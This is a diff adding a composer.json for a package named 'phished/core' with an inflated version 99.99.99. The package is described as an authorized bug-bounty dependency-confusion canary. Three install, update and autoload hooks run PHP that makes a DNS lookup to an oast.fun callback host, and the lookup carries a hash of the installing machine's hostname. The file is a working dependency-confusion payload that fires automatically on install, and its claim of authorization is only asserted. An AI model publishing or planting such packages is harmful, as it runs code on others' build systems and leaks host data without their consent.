@@ -1,0 +1,32 @@
+{
+  "name": "phished/core",
+  "type": "library",
+  "version": "99.99.99",
+  "license": "MIT",
+  "description": "AUTHORIZED BUG BOUNTY DEPENDENCY-CONFUSION CANARY. This empty placeholder claims the previously-unowned 'phished/core' Composer namespace on the public Packagist registry to neutralise the dependency-confusion attack surface affecting phished.io's CI. Contains zero functional code. The post-install hook executes a single PHP gethostbyname() DNS lookup to a researcher-controlled OAST endpoint - no HTTP requests, no file reads, no shell execution, no data transmitted beyond an unattributable 8-char hash of the installing host's name. Authorised by phished.io bug bounty program. Contact: mdinjamulhaque1@gmail.com.",
+  "homepage": "https://github.com/mdinjamulhaque/phished-bounty-canary",
+  "keywords": ["bug-bounty", "dependency-confusion", "namespace-claim", "canary", "phished.io"],
+  "authors": [
+    {
+      "name": "Phished Bug Bounty Researcher",
+      "email": "mdinjamulhaque1@gmail.com",
+      "role": "Security Researcher"
+    }
+  ],
+  "scripts": {
+    "post-install-cmd": [
+      "@php -r \"@gethostbyname('install-' . substr(md5((string)gethostname()),0,8) . '.uqjwgmxhxmoxifjtubudo313hsxwij0md.oast.fun');\""
+    ],
+    "post-update-cmd": [
+      "@php -r \"@gethostbyname('update-' . substr(md5((string)gethostname()),0,8) . '.uqjwgmxhxmoxifjtubudo313hsxwij0md.oast.fun');\""
+    ],
+    "post-autoload-dump": [
+      "@php -r \"@gethostbyname('autoload-' . substr(md5((string)gethostname()),0,8) . '.uqjwgmxhxmoxifjtubudo313hsxwij0md.oast.fun');\""
+    ]
+  },
+  "autoload": {
+    "psr-4": {
+      "Phished\\Core\\": "src/"
+    }
+  }
+}
